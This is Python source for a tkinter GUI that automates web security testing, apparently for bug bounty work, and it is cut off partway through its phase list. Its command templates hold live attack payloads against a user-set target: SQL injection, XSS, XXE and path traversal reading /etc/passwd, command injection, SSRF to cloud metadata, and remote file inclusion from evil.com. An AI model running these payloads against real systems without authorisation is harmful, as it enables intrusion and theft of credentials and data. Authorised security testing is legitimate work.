import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox
import json
import subprocess
import threading
import queue
import sqlite3
from datetime import datetime
import os
import webbrowser
from pathlib import Path

class WebBugBountyHunterV3:
    def __init__(self, root):
        self.root = root
        self.root.title("🎯 Web Application Security Automation Tool")
        self.root.geometry("1800x1000")
        self.root.configure(bg="#0a0a0a")
        
        # State
        self.active_phase = None
        self.completed_steps = set()
        self.target_domain = tk.StringVar(value="target.com")
        self.is_running = False
        self.current_process = None
        self.output_queue = queue.Queue()
        self.findings_count = {"critical": 0, "high": 0, "medium": 0, "low": 0}
        
        # Database
        self.setup_database()
        
        # UI
        self.setup_styles()
        self.create_ui()
        
        # Load phases
        self.automation_phases = self.get_owasp_phases()
        self.create_phase_cards()
        
        # Monitor
        self.monitor_output()
        
    def setup_database(self):
        """Initialize SQLite database"""
        self.db_path = "web_bugbounty_v3.db"
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS scan_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                target TEXT,
                phase TEXT,
                tool TEXT,
                owasp_category TEXT,
                command TEXT,
                output TEXT,
                status TEXT,
                severity TEXT
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS vulnerabilities (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                scan_id INTEGER,
                vuln_type TEXT,
                severity TEXT,
                url TEXT,
                parameter TEXT,
                payload TEXT,
                evidence TEXT,
                cvss_score REAL,
                cwe_id TEXT,
                owasp_cat TEXT,
                timestamp TEXT,
                FOREIGN KEY (scan_id) REFERENCES scan_results(id)
            )
        ''')
        
        conn.commit()
        conn.close()
        
    def setup_styles(self):
        style = ttk.Style()
        style.theme_use('clam')
        
        style.configure("Card.TFrame", background="#1a1a2e", relief="solid", borderwidth=1)
        style.configure("Title.TLabel", background="#0a0a0a", foreground="#00ff41", 
                       font=("Courier New", 28, "bold"))
        
    def create_ui(self):
        # Main container
        main_container = tk.Frame(self.root, bg="#0a0a0a")
        main_container.pack(fill=tk.BOTH, expand=True)
        
        # Left panel
        left_panel = tk.Frame(main_container, bg="#0a0a0a")
        left_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=15, pady=15)
        
        self.create_header(left_panel)
        self.create_target_input(left_panel)
        self.create_owasp_stats(left_panel)
        self.create_progress_bar(left_panel)
        self.create_phases_area(left_panel)
        
        # Right panel
        right_panel = tk.Frame(main_container, bg="#0a0a0a", width=550)
        right_panel.pack(side=tk.RIGHT, fill=tk.BOTH, padx=(0, 15), pady=15)
        right_panel.pack_propagate(False)
        
        self.create_terminal_output(right_panel)
        self.create_findings_panel(right_panel)
        self.create_action_buttons(right_panel)
        
    def create_header(self, parent):
        header = tk.Frame(parent, bg="#0a0a0a")
        header.pack(fill=tk.X, pady=(0, 10))
        
        left_frame = tk.Frame(header, bg="#0a0a0a")
        left_frame.pack(side=tk.LEFT)
        
        title = tk.Label(left_frame, text="🎯 Web Application Security Automation Tool", 
                        bg="#0a0a0a", fg="#00ff41",
                        font=("Courier New", 28, "bold"))
        title.pack(anchor=tk.W)
        
        subtitle = tk.Label(left_frame, text="OWASP Top 10 | 90+ Tools | Full Automation", 
                           bg="#0a0a0a", fg="#00d4ff",
                           font=("Courier New", 12))
        subtitle.pack(anchor=tk.W)
        
        self.subtitle_label = tk.Label(left_frame, text="Ready to hunt bugs...", 
                                      bg="#0a0a0a", fg="#888888",
                                      font=("Courier New", 10))
        self.subtitle_label.pack(anchor=tk.W)
        
        # Control buttons
        right_frame = tk.Frame(header, bg="#0a0a0a")
        right_frame.pack(side=tk.RIGHT)
        
        self.start_button = tk.Button(right_frame, text="▶ START FULL SCAN", 
                                      bg="#00ff41", fg="#000000", 
                                      font=("Courier New", 12, "bold"),
                                      padx=30, pady=15, relief=tk.FLAT,
                                      cursor="hand2", command=self.start_full_automation)
        self.start_button.pack(side=tk.LEFT, padx=5)
        
        self.stop_button = tk.Button(right_frame, text="⏹ STOP", 
                                     bg="#ff0055", fg="#ffffff", 
                                     font=("Courier New", 12, "bold"),
                                     padx=30, pady=15, relief=tk.FLAT,
                                     cursor="hand2", command=self.stop_automation,
                                     state=tk.DISABLED)
        self.stop_button.pack(side=tk.LEFT, padx=5)
        
    def create_target_input(self, parent):
        target_frame = tk.Frame(parent, bg="#1a1a2e", relief=tk.SOLID, borderwidth=2)
        target_frame.pack(fill=tk.X, pady=(0, 10))
        
        inner = tk.Frame(target_frame, bg="#1a1a2e")
        inner.pack(fill=tk.X, padx=20, pady=15)
        
        tk.Label(inner, text="🎯 TARGET:", bg="#1a1a2e", fg="#00ff41",
                font=("Courier New", 12, "bold")).pack(side=tk.LEFT, padx=(0, 15))
        
        target_entry = tk.Entry(inner, textvariable=self.target_domain, 
                               bg="#0a0a0a", fg="#00ff41", 
                               font=("Courier New", 12, "bold"), relief=tk.FLAT,
                               insertbackground="#00ff41", borderwidth=2)
        target_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, ipady=10, padx=(0, 15))
        
        tk.Button(inner, text="📋 LOAD FILE", bg="#00d4ff", fg="#000000",
                 font=("Courier New", 10, "bold"), padx=15, pady=10, relief=tk.FLAT,
                 cursor="hand2", command=self.load_targets_file).pack(side=tk.LEFT)
        
    def create_owasp_stats(self, parent):
        """OWASP Top 10 coverage stats"""
        owasp_frame = tk.Frame(parent, bg="#1a1a2e", relief=tk.SOLID, borderwidth=2)
        owasp_frame.pack(fill=tk.X, pady=(0, 10))
        
        tk.Label(owasp_frame, text="⚡ OWASP TOP 10 COVERAGE", 
                bg="#1a1a2e", fg="#ff0055",
                font=("Courier New", 11, "bold")).pack(pady=(10, 5))
        
        stats_container = tk.Frame(owasp_frame, bg="#1a1a2e")
        stats_container.pack(fill=tk.X, padx=10, pady=(0, 10))
        
        owasp_cats = [
            ("A01", "Access Control", "#ff0055"),
            ("A02", "Crypto Failures", "#ff6b00"),
            ("A03", "Injection", "#ffd000"),
            ("A04", "Insecure Design", "#00ff41"),
            ("A05", "Misconfig", "#00d4ff"),
            ("A06", "Vuln Components", "#a855f7"),
            ("A07", "Auth Failures", "#ff0055"),
            ("A08", "Data Integrity", "#ff6b00"),
            ("A09", "Log Failures", "#ffd000"),
            ("A10", "SSRF", "#00ff41")
        ]
        
        for i, (code, name, color) in enumerate(owasp_cats):
            row = i // 5
            col = i % 5
            
            if col == 0:
                row_frame = tk.Frame(stats_container, bg="#1a1a2e")
                row_frame.pack(fill=tk.X, pady=2)
            
            cat_label = tk.Label(row_frame, text=f"{code}: {name}", 
                               bg="#0a0a0a", fg=color,
                               font=("Courier New", 8, "bold"), 
                               padx=8, pady=5, relief=tk.SOLID, borderwidth=1)
            cat_label.pack(side=tk.LEFT, padx=2, fill=tk.X, expand=True)
            
    def create_progress_bar(self, parent):
        progress_frame = tk.Frame(parent, bg="#1a1a2e", relief=tk.SOLID, borderwidth=2)
        progress_frame.pack(fill=tk.X, pady=(0, 10))
        
        inner = tk.Frame(progress_frame, bg="#1a1a2e")
        inner.pack(fill=tk.X, padx=20, pady=15)
        
        top = tk.Frame(inner, bg="#1a1a2e")
        top.pack(fill=tk.X)
        
        tk.Label(top, text="SCAN PROGRESS", bg="#1a1a2e", fg="#888888", 
                font=("Courier New", 10, "bold")).pack(side=tk.LEFT)
        
        self.progress_text = tk.Label(top, text="0%", bg="#1a1a2e", fg="#00ff41", 
                                     font=("Courier New", 10, "bold"))
        self.progress_text.pack(side=tk.RIGHT)
        
        self.current_task_label = tk.Label(inner, text="Ready to start scanning...", 
                                          bg="#1a1a2e", fg="#00d4ff",
                                          font=("Courier New", 9))
        self.current_task_label.pack(fill=tk.X, pady=(5, 10))
        
        # Stats row
        stats_row = tk.Frame(inner, bg="#1a1a2e")
        stats_row.pack(fill=tk.X, pady=(0, 10))
        
        self.stat_labels = {}
        stats = [
            ("tools", "0/90", "Tools", "#00ff41"),
            ("critical", "0", "Critical", "#ff0055"),
            ("high", "0", "High", "#ff6b00"),
            ("medium", "0", "Medium", "#ffd000")
        ]
        
        for key, value, label, color in stats:
            stat = tk.Frame(stats_row, bg="#0a0a0a", relief=tk.SOLID, borderwidth=1)
            stat.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=3)
            
            tk.Label(stat, text=value, bg="#0a0a0a", fg=color,
                    font=("Courier New", 16, "bold")).pack(pady=(5, 0))
            tk.Label(stat, text=label, bg="#0a0a0a", fg="#888888",
                    font=("Courier New", 7)).pack(pady=(0, 5))
            
            self.stat_labels[key] = stat.winfo_children()[0]
        
        # Progress bar
        progress_bg = tk.Canvas(inner, height=16, bg="#0a0a0a", highlightthickness=0)
        progress_bg.pack(fill=tk.X)
        
        self.progress_bar = progress_bg.create_rectangle(0, 0, 0, 16, fill="#00ff41", outline="")
        self.progress_canvas = progress_bg
        
    def create_phases_area(self, parent):
        canvas_frame = tk.Frame(parent, bg="#0a0a0a")
        canvas_frame.pack(fill=tk.BOTH, expand=True)
        
        self.canvas = tk.Canvas(canvas_frame, bg="#0a0a0a", highlightthickness=0)
        scrollbar = ttk.Scrollbar(canvas_frame, orient="vertical", command=self.canvas.yview)
        self.scrollable_frame = tk.Frame(self.canvas, bg="#0a0a0a")
        
        self.scrollable_frame.bind(
            "<Configure>",
            lambda e: self.canvas.configure(scrollregion=self.canvas.bbox("all"))
        )
        
        self.canvas.create_window((0, 0), window=self.scrollable_frame, anchor="nw")
        self.canvas.configure(yscrollcommand=scrollbar.set)
        
        self.canvas.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
        
        self.canvas.bind_all("<MouseWheel>", self._on_mousewheel)
        
    def _on_mousewheel(self, event):
        self.canvas.yview_scroll(int(-1*(event.delta/120)), "units")
        
    def create_terminal_output(self, parent):
        terminal_frame = tk.Frame(parent, bg="#1a1a2e", relief=tk.SOLID, borderwidth=2)
        terminal_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
        
        header = tk.Frame(terminal_frame, bg="#0a0a0a")
        header.pack(fill=tk.X, padx=2, pady=2)
        
        tk.Label(header, text="💻 LIVE TERMINAL", bg="#0a0a0a", fg="#00ff41",
                font=("Courier New", 11, "bold")).pack(side=tk.LEFT, padx=15, pady=10)
        
        clear_btn = tk.Button(header, text="🗑 CLEAR", bg="#ff0055", fg="#ffffff",
                             font=("Courier New", 9, "bold"), padx=12, pady=6, relief=tk.FLAT,
                             cursor="hand2", command=self.clear_terminal)
        clear_btn.pack(side=tk.RIGHT, padx=15)
        
        self.terminal_output = scrolledtext.ScrolledText(
            terminal_frame, bg="#0a0a0a", fg="#00ff41",
            font=("Courier New", 9), relief=tk.FLAT,
            padx=15, pady=10, wrap=tk.WORD, height=15
        )
        self.terminal_output.pack(fill=tk.BOTH, expand=True, padx=2, pady=(0, 2))
        
        self.terminal_output.tag_config("info", foreground="#00d4ff")
        self.terminal_output.tag_config("success", foreground="#00ff41")
        self.terminal_output.tag_config("error", foreground="#ff0055")
        self.terminal_output.tag_config("warning", foreground="#ffd000")
        self.terminal_output.tag_config("critical", foreground="#ff0055", font=("Courier New", 9, "bold"))
        
        self.log_terminal("🎯 Web Application Security Automation Tool", "success")
        self.log_terminal("⚡ 90+ tools loaded | OWASP Top 10 ready", "info")
        
    def create_findings_panel(self, parent):
        findings_frame = tk.Frame(parent, bg="#1a1a2e", relief=tk.SOLID, borderwidth=2)
        findings_frame.pack(fill=tk.BOTH, pady=(0, 10))
        
        tk.Label(findings_frame, text="🔍 RECENT FINDINGS", bg="#1a1a2e", fg="#ffd000",
                font=("Courier New", 11, "bold")).pack(pady=10)
        
        self.findings_text = scrolledtext.ScrolledText(
            findings_frame, bg="#0a0a0a", fg="#00ff41",
            font=("Courier New", 8), relief=tk.FLAT,
            padx=10, pady=10, wrap=tk.WORD, height=8
        )
        self.findings_text.pack(fill=tk.BOTH, expand=True, padx=2, pady=(0, 2))
        
        self.findings_text.insert("1.0", "No vulnerabilities found yet...\nStart scanning to discover issues!\n")
        
    def create_action_buttons(self, parent):
        action_frame = tk.Frame(parent, bg="#0a0a0a")
        action_frame.pack(fill=tk.X)
        
        buttons = [
            ("📊 EXPORT REPORT", self.export_report, "#00ff41"),
            ("💾 SAVE RESULTS", self.save_results, "#00d4ff"),
            ("🔔 WEBHOOKS", self.configure_notifications, "#ffd000"),
            ("📁 OPEN FOLDER", self.open_results_folder, "#a855f7")
        ]
        
        for text, command, color in buttons:
            btn = tk.Button(action_frame, text=text, bg=color, fg="#000000",
                           font=("Courier New", 10, "bold"), padx=15, pady=12, relief=tk.FLAT,
                           cursor="hand2", command=command)
            btn.pack(fill=tk.X, pady=3)
            
    def get_owasp_phases(self):
        """Define all 9 phases with 90+ tools"""
        return [
            {
                "id": 1, 
                "name": "🔍 Phase 1: Reconnaissance & Asset Discovery", 
                "color": "#00ff41",
                "duration": "2-4 hours", 
                "icon": "🔍",
                "owasp": "A05:2021 - Security Misconfiguration",
                "tools": [
                    {
                        "name": "Subfinder",
                        "cmd": "subfinder -d {target} -all -recursive -o results/subdomains_subfinder.txt",
                        "desc": "Passive subdomain discovery from 50+ sources",
                        "category": "Subdomain Enum"
                    },
                    {
                        "name": "Sublist3r",
                        "cmd": "sublist3r -d {target} -o results/subdomains_sublist3r.txt",
                        "desc": "Fast subdomain enumeration tool",
                        "category": "Subdomain Enum"
                    },
                    {
                        "name": "Assetfinder",
                        "cmd": "assetfinder --subs-only {target} > results/subdomains_assetfinder.txt",
                        "desc": "Find domains and subdomains related to target",
                        "category": "Subdomain Enum"
                    },
                    {
                        "name": "Amass",
                        "cmd": "amass enum -passive -d {target} -o results/subdomains_amass.txt",
                        "desc": "In-depth DNS enumeration and network mapping",
                        "category": "Subdomain Enum"
                    },
                    {
                        "name": "SubBrute",
                        "cmd": "python3 /opt/subbrute/subbrute.py {target} -o results/subdomains_subbrute.txt",
                        "desc": "Fast subdomain bruteforcing",
                        "category": "Subdomain Enum"
                    },
                    {
                        "name": "X-Recon",
                        "cmd": "python3 /opt/X-Recon/x-recon.py -d {target} -o results/",
                        "desc": "Advanced reconnaissance framework",
                        "category": "Recon Framework"
                    },
                    {
                        "name": "SubRabbit",
                        "cmd": "subrabbit -d {target} -o results/subdomains_subrabbit.txt",
                        "desc": "Fast subdomain scanner with DNS validation",
                        "category": "Subdomain Enum"
                    },
                    {
                        "name": "theHarvester",
                        "cmd": "theHarvester -d {target} -b all -f results/harvester",
                        "desc": "OSINT tool for emails, names, subdomains, IPs",
                        "category": "OSINT"
                    },
                    {
                        "name": "SpiderFoot",
                        "cmd": "python3 /opt/spiderfoot/sf.py -s {target} -o json > results/spiderfoot.json",
                        "desc": "Automated OSINT reconnaissance tool",
                        "category": "OSINT"
                    },
                    {
                        "name": "Shodan",
                        "cmd": "shodan search hostname:{target} --fields ip_str,port,org,hostnames > results/shodan.txt",
                        "desc": "Search engine for Internet-connected devices",
                        "category": "OSINT"
                    },
                    {
                        "name": "Httpx",
                        "cmd": "cat results/subdomains_*.txt | sort -u | httpx -silent -tech-detect -status-code -title -o results/live_hosts.txt",
                        "desc": "Fast HTTP toolkit with tech detection",
                        "category": "Probing"
                    },
                    {
                        "name": "Wappalyzer",
                        "cmd": "wappalyzer https://{target} -o results/wappalyzer.json",
                        "desc": "Identify technologies used on websites",
                        "category": "Tech Detection"
                    }
                ],
                "automation": "Auto-run every 6 hours | Discord alerts on new subdomains"
            },
            {
                "id": 2,
                "name": "📂 Phase 2: Directory & File Discovery",
                "color": "#00d4ff",
                "duration": "3-6 hours",
                "icon": "📂",
                "owasp": "A05:2021 - Security Misconfiguration",
                "tools": [
                    {
                        "name": "FFUF",
                        "cmd": "ffuf -u https://{target}/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403 -o results/ffuf.json",
                        "desc": "Fast web fuzzer for content discovery",
                        "category": "Fuzzing"
                    },
                    {
                        "name": "Gobuster Dir",
                        "cmd": "gobuster dir -u https://{target} -w /usr/share/wordlists/dirb/common.txt -o results/gobuster_dir.txt",
                        "desc": "Directory/file bruteforcing",
                        "category": "Bruteforce"
                    },
                    {
                        "name": "Dirsearch",
                        "cmd": "dirsearch -u https://{target} -e php,html,js,txt -o results/dirsearch.txt",
                        "desc": "Web path scanner with advanced features",
                        "category": "Directory Scan"
                    },
                    {
                        "name": "Dirb",
                        "cmd": "dirb https://{target} /usr/share/wordlists/dirb/common.txt -o results/dirb.txt",
                        "desc": "Web content scanner",
                        "category": "Directory Scan"
                    },
                    {
                        "name": "DirBuster (CLI)",
                        "cmd": "java -jar /opt/DirBuster/DirBuster.jar -u https://{target} -l /usr/share/wordlists/dirb/common.txt -r results/dirbuster.txt",
                        "desc": "Multi-threaded directory bruteforcer",
                        "category": "Bruteforce"
                    },
                    {
                        "name": "Feroxbuster",
                        "cmd": "feroxbuster -u https://{target} -w /usr/share/wordlists/dirb/common.txt -o results/feroxbuster.txt",
                        "desc": "Fast content discovery with recursion",
                        "category": "Recursive Scan"
                    },
                    {
                        "name": "Katana",
                        "cmd": "katana -u https://{target} -d 5 -jc -kf all -aff -o results/katana_crawl.txt",
                        "desc": "Next-gen crawling and spidering framework",
                        "category": "Crawling"
                    },
                    {
                        "name": "GAU",
                        "cmd": "echo {target} | gau --threads 10 --blacklist ttf,woff,svg,png,jpg > results/gau_urls.txt",
                        "desc": "Fetch known URLs from AlienVault, Wayback, Common Crawl",
                        "category": "URL Collection"
                    },
                    {
                        "name": "Paramspider",
                        "cmd": "paramspider -d {target} -o results/paramspider.txt",
                        "desc": "Mining parameters from web archives",
                        "category": "Parameter Discovery"
                    },
                    {
                        "name": "Arjun",
                        "cmd": "arjun -u https://{target} -oT results/arjun.txt",
                        "desc": "HTTP parameter discovery suite",
                        "category": "Parameter Discovery"
                    }
                ],
                "automation": "Run after Phase 1 completes | Auto-dedup URLs"
            },
            {
                "id": 3,
                "name": "🛡️ Phase 3: Web Vulnerability Scanning",
                "color": "#ff0055",
                "duration": "4-8 hours",
                "icon": "🛡️",
                "owasp": "A06:2021 - Vulnerable & Outdated Components",
                "tools": [
                    {
                        "name": "Nuclei (All Templates)",
                        "cmd": "nuclei -list results/live_hosts.txt -t ~/nuclei-templates/ -severity critical,high,medium -o results/nuclei_all.txt",
                        "desc": "Template-based vulnerability scanner",
                        "category": "Multi-Vuln"
                    },
                    {
                        "name": "Nuclei (CVE Only)",
                        "cmd": "nuclei -list results/live_hosts.txt -t ~/nuclei-templates/cves/ -o results/nuclei_cve.txt",
                        "desc": "CVE-specific scanning",
                        "category": "CVE Scan"
                    },
                    {
                        "name": "Nuclei (Exposures)",
                        "cmd": "nuclei -list results/live_hosts.txt -t ~/nuclei-templates/exposures/ -o results/nuclei_exposures.txt",
                        "desc": "Exposed panels, configs, files",
                        "category": "Exposure Scan"
                    },
                    {
                        "name": "Nikto",
                        "cmd": "nikto -h https://{target} -output results/nikto.txt",
                        "desc": "Web server scanner for known vulnerabilities",
                        "category": "Web Server Scan"
                    },
                    {
                        "name": "Wapiti",
                        "cmd": "wapiti -u https://{target} -f txt -o results/wapiti.txt",
                        "desc": "Web application vulnerability scanner",
                        "category": "Web App Scan"
                    },
                    {
                        "name": "WPScan",
                        "cmd": "wpscan --url https://{target} --enumerate vp,vt,u --output results/wpscan.txt",
                        "desc": "WordPress security scanner",
                        "category": "CMS Scan"
                    },
                    {
                        "name": "RapidScan",
                        "cmd": "python3 /opt/rapidscan/rapidscan.py {target}",
                        "desc": "Multi-tool security scanner",
                        "category": "Multi-Tool"
                    },
                    {
                        "name": "Sn1per",
                        "cmd": "sniper -t {target} -m web -o results/sn1per/",
                        "desc": "Automated pentest framework",
                        "category": "Framework"
                    },
                    {
                        "name": "Skipfish",
                        "cmd": "skipfish -o results/skipfish https://{target}",
                        "desc": "Active web application security scanner",
                        "category": "Active Scan"
                    },
                    {
                        "name": "Argus",
                        "cmd": "python3 /opt/argus/argus.py -u https://{target} -o results/argus.txt",
                        "desc": "Advanced vulnerability scanner",
                        "category": "Advanced Scan"
                    },
                    {
                        "name": "Nessus (if available)",
                        "cmd": "# Manual: nessuscli scan new --targets {target}",
                        "desc": "Professional vulnerability scanner (requires license)",
                        "category": "Professional"
                    }
                ],
                "automation": "Run at 2 AM daily | Critical findings → Discord webhook"
            },
            {
                "id": 4,
                "name": "💉 Phase 4: SQL Injection Testing",
                "color": "#ffd000",
                "duration": "3-5 hours",
                "icon": "💉",
                "owasp": "A03:2021 - Injection",
                "tools": [
                    {
                        "name": "SQLMap (Auto)",
                        "cmd": "sqlmap -u 'https://{target}/?id=1' --batch --random-agent --level=5 --risk=3",
                        "desc": "Automatic SQL injection detection and exploitation",
                        "category": "Auto SQLi"
                    },
                    {
                        "name": "SQLMap (Forms)",
                        "cmd": "sqlmap -u 'https://{target}/login' --forms --batch --random-agent",
                        "desc": "Test all forms on target page",
                        "category": "Form SQLi"
                    },
                    {
                        "name": "SQLMap (POST)",
                        "cmd": "sqlmap -u 'https://{target}/search' --data='q=test' --batch",
                        "desc": "Test POST parameters",
                        "category": "POST SQLi"
                    },
                    {
                        "name": "SQLMap (Headers)",
                        "cmd": "sqlmap -u 'https://{target}' --headers='X-Forwarded-For: 127.0.0.1*' --batch",
                        "desc": "Test HTTP headers for SQLi",
                        "category": "Header SQLi"
                    },
                    {
                        "name": "SQLMap (Cookies)",
                        "cmd": "sqlmap -u 'https://{target}' --cookie='session=abc*' --batch",
                        "desc": "Test cookie parameters",
                        "category": "Cookie SQLi"
                    },
                    {
                        "name": "Manual SQLi (Error-based)",
                        "cmd": "curl 'https://{target}/?id=1\\' -o results/sqli_error.html",
                        "desc": "Test for error-based SQL injection",
                        "category": "Manual Test"
                    },
                    {
                        "name": "Manual SQLi (Union)",
                        "cmd": "curl 'https://{target}/?id=1 UNION SELECT NULL,NULL,NULL--' -o results/sqli_union.html",
                        "desc": "Test for UNION-based SQLi",
                        "category": "Manual Test"
                    },
                    {
                        "name": "Manual SQLi (Boolean)",
                        "cmd": "curl 'https://{target}/?id=1 AND 1=1--' -o results/sqli_boolean.html",
                        "desc": "Test for boolean-based blind SQLi",
                        "category": "Manual Test"
                    },
                    {
                        "name": "Manual SQLi (Time-based)",
                        "cmd": "curl 'https://{target}/?id=1 AND SLEEP(5)--' -o results/sqli_time.html",
                        "desc": "Test for time-based blind SQLi",
                        "category": "Manual Test"
                    },
                    {
                        "name": "NoSQLMap",
                        "cmd": "python3 /opt/NoSQLMap/nosqlmap.py -u https://{target} -o results/nosql.txt",
                        "desc": "NoSQL injection testing tool",
                        "category": "NoSQL"
                    }
                ],
                "automation": "Test all URLs with parameters | Auto-verify findings"
            },
            {
                "id": 5,
                "name": "⚡ Phase 5: XSS Testing",
                "color": "#a855f7",
                "duration": "3-5 hours",
                "icon": "⚡",
                "owasp": "A03:2021 - Injection",
                "tools": [
                    {
                        "name": "XSStrike",
                        "cmd": "xsstrike -u 'https://{target}/?search=test' --crawl",
                        "desc": "Advanced XSS detection and exploitation suite",
                        "category": "Auto XSS"
                    },
                    {
                        "name": "PwnXSS",
                        "cmd": "python3 /opt/PwnXSS/pwnxss.py -u https://{target}",
                        "desc": "XSS vulnerability scanner and exploiter",
                        "category": "Auto XSS"
                    },
                    {
                        "name": "XSS_Vibes",
                        "cmd": "python3 /opt/xss_vibes/xss_vibes.py -u https://{target}",
                        "desc": "XSS detection with advanced payloads",
                        "category": "Auto XSS"
                    },
                    {
                        "name": "Dalfox",
                        "cmd": "dalfox url https://{target}/?q=test -o results/dalfox.txt",
                        "desc": "Fast XSS scanner with powerful analysis engine",
                        "category": "Fast XSS"
                    },
                    {
                        "name": "Kxss",
                        "cmd": "cat results/gau_urls.txt | grep = | kxss > results/kxss.txt",
                        "desc": "Reflected XSS parameter finder",
                        "category": "Reflected XSS"
                    },
                    {
                        "name": "Manual XSS (Reflected)",
                        "cmd": "curl 'https://{target}/?search=<script>alert(1)</script>' -o results/xss_reflected.html",
                        "desc": "Test for reflected XSS",
                        "category": "Manual Test"
                    },
                    {
                        "name": "Manual XSS (DOM)",
                        "cmd": "curl 'https://{target}/#<img src=x onerror=alert(1)>' -o results/xss_dom.html",
                        "desc": "Test for DOM-based XSS",
                        "category": "Manual Test"
                    },
                    {
                        "name": "Manual XSS (Stored)",
                        "cmd": "# Manual testing required - check forms/comments/profiles",
                        "desc": "Test for stored/persistent XSS",
                        "category": "Manual Test"
                    },
                    {
                        "name": "XSS Polyglot",
                        "cmd": "curl 'https://{target}/?q=jaVasCript:/*-/*`/*\\`/*\\'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//' -o results/xss_polyglot.html",
                        "desc": "Test with XSS polyglot payload",
                        "category": "Advanced"
                    }
                ],
                "automation": "Scan all input parameters | Auto-verify with headless browser"
            },
            {
                "id": 6,
                "name": "🔐 Phase 6: IDOR & Access Control",
                "color": "#ff6b00",
                "duration": "2-4 hours",
                "icon": "🔐",
                "owasp": "A01:2021 - Broken Access Control",
                "tools": [
                    {
                        "name": "Manual IDOR (Numeric)",
                        "cmd": "for i in {1..100}; do curl 'https://{target}/api/user/$i' -H 'Authorization: Bearer TOKEN' >> results/idor_numeric.txt; done",
                        "desc": "Test numeric ID parameters for IDOR",
                        "category": "IDOR"
                    },
                    {
                        "name": "Manual IDOR (UUID)",
                        "cmd": "# Test UUID-based endpoints with Burp Intruder",
                        "desc": "Test UUID parameters for access control",
                        "category": "IDOR"
                    },
                    {
                        "name": "Parameter Tampering",
                        "cmd": "curl 'https://{target}/profile?user_id=1&role=admin' -H 'Cookie: session=abc' -o results/param_tamper.html",
                        "desc": "Test parameter manipulation",
                        "category": "Access Control"
                    },
                    {
                        "name": "HTTP Methods Testing",
                        "cmd": "for method in GET POST PUT DELETE PATCH; do curl -X $method https://{target}/api/endpoint >> results/http_methods.txt; done",
                        "desc": "Test all HTTP methods on endpoints",
                        "category": "HTTP Methods"
                    },
                    {
                        "name": "Authorization Bypass",
                        "cmd": "curl https://{target}/admin -H 'X-Original-URL: /admin' -H 'X-Rewrite-URL: /admin' -o results/auth_bypass.html",
                        "desc": "Test authorization bypass techniques",
                        "category": "Auth Bypass"
                    },
                    {
                        "name": "CORS Misconfiguration",
                        "cmd": "curl -H 'Origin: https://evil.com' -I https://{target} | grep -i 'access-control' > results/cors.txt",
                        "desc": "Test for CORS misconfigurations",
                        "category": "CORS"
                    },
                    {
                        "name": "JWT Token Analysis",
                        "cmd": "# Use jwt_tool: jwt_tool TOKEN -X k -pk public.pem",
                        "desc": "Test JWT algorithm confusion and weaknesses",
                        "category": "JWT"
                    },
                    {
                        "name": "Session Fixation",
                        "cmd": "curl -c cookies.txt https://{target}/login && curl -b cookies.txt https://{target}/profile",
                        "desc": "Test for session fixation vulnerabilities",
                        "category": "Session"
                    }
                ],
                "automation": "Semi-automated | Requires manual verification"
            },
            {
                "id": 7,
                "name": "🎯 Phase 7: Other OWASP Top 10",
                "color": "#00ff41",
                "duration": "4-6 hours",
                "icon": "🎯",
                "owasp": "Multiple OWASP Categories",
                "tools": [
                    {
                        "name": "SSRF (AWS Metadata)",
                        "cmd": "curl 'https://{target}/?url=http://169.254.169.254/latest/meta-data/' -o results/ssrf_aws.txt",
                        "desc": "Test for SSRF to AWS metadata endpoint",
                        "category": "SSRF - A10"
                    },
                    {
                        "name": "SSRF (Internal IPs)",
                        "cmd": "curl 'https://{target}/?url=http://127.0.0.1:80' -o results/ssrf_localhost.txt",
                        "desc": "Test for SSRF to internal services",
                        "category": "SSRF - A10"
                    },
                    {
                        "name": "XXE Injection",
                        "cmd": "curl -X POST https://{target}/upload -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>' -o results/xxe.txt",
                        "desc": "Test for XML External Entity injection",
                        "category": "XXE - A03"
                    },
                    {
                        "name": "LFI Testing",
                        "cmd": "curl 'https://{target}/?file=../../../../etc/passwd' -o results/lfi.txt",
                        "desc": "Test for Local File Inclusion",
                        "category": "LFI - A03"
                    },
                    {
                        "name": "RFI Testing",
                        "cmd": "curl 'https://{target}/?page=http://evil.com/shell.txt' -o results/rfi.txt",
                        "desc": "Test for Remote File Inclusion",
                        "category": "RFI - A03"
                    },
                    {
                        "name": "CSRF Testing",
                        "cmd": "# Manual: Create CSRF PoC with form auto-submit",
                        "desc": "Test for Cross-Site Request Forgery",
                        "category": "CSRF - A01"
                    },
                    {
                        "name": "Open Redirect",
                        "cmd": "curl 'https://{target}/redirect?url=https://evil.com' -I -o results/open_redirect.txt",
                        "desc": "Test for open redirect vulnerabilities",
                        "category": "Open Redirect"
                    },
                    {
                        "name": "Command Injection",
                        "cmd": "curl 'https://{target}/?cmd=;cat /etc/passwd' -o results/cmd_injection.txt",
                        "desc": "Test for OS command injection",
                        "category": "Command Inj - A03"
                    },
                    {
                        "name": "SSTI (Server-Side Template Injection)",
                        "cmd": "curl 'https://{target}/?name={{7*7}}' -o results/ssti.txt",
                        "desc": "Test for template injection",
                        "category": "SSTI - A03"
                    },
                    {
                        "name": "Security Headers Check",
                        "cmd": "curl -I https://{target} | grep -E '(X-Frame-Options|Content-Security-Policy|X-XSS-Protection|Strict-Transport-Security)' > results/headers.txt",
                        "desc": "Check for security headers (A05)",
                        "category": "Headers - A05"
                    },
                    {
                        "name": "Sensitive Data Exposure",
                        "cmd": "curl https://{target}/.env -o results/env.txt && curl https://{target}/.git/config -o results/git.txt",
                        "desc": "Check for exposed sensitive files (A02)",
                        "category": "Data Exp - A02"
                    },
                    {
                        "name": "File Upload Bypass",
                        "cmd": "# Manual: Test file upload with .php.jpg, .phar, null byte",
                        "desc": "Test file upload restrictions bypass (A08)",
